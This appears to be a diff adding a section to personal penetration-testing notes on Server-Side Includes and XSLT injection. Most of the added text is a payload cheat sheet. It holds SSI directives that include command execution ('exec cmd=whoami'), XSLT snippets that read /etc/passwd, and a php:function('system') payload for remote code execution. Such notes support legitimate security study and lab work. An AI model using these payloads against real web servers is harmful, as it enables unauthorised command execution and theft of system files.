@@ -48,3 +48,44 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20
 
 # SSI
 Server-Side Includes (SSI) is a technology web applications use to create dynamic content on HTML pages. SSI is supported by many popular web servers such as [Apache](https://httpd.apache.org/docs/current/howto/ssi.html) and [IIS](https://learn.microsoft.com/en-us/iis/configuration/system.webserver/serversideinclude). The use of SSI can often be inferred from the file extension. Typical file extensions include `.shtml`, `.shtm`, and `.stm`. However, web servers can be configured to support SSI directives in arbitrary file extensions. As such, we cannot conclusively conclude whether SSI is used only from the file extension.
+
+=> STI leverages param vuln
+
+| Print variables         | `<!--#printenv -->`                                  |
+| ----------------------- | ---------------------------------------------------- |
+| Change config           | `<!--#config errmsg="Error!" -->`                    |
+| Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` |
+| Execute command         | `<!--#exec cmd="whoami" -->`                         |
+| Include web file        | `<!--#include virtual="index.html" -->`              |
+
+# XSLT
+## Verify XSLT Vuln
+![[Pasted image 20250411111427.png]]
+
+## Information Disclosure
+```xml
+Version: <xsl:value-of select="system-property('xsl:version')" />
+<br/>
+Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+<br/>
+Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+<br/>
+Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+<br/>
+Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+```
+
+## Local File Inclusion (LFI) (XSLT ver2.0)
+```xml
+<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+```
+
+## Local File Inclusion (LFI) (XSLT ver1.0)
+```xml
+<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+```
+
+## Remote Code Execution (RCE)
+```xml
+<xsl:value-of select="php:function('system','id')" />
+```
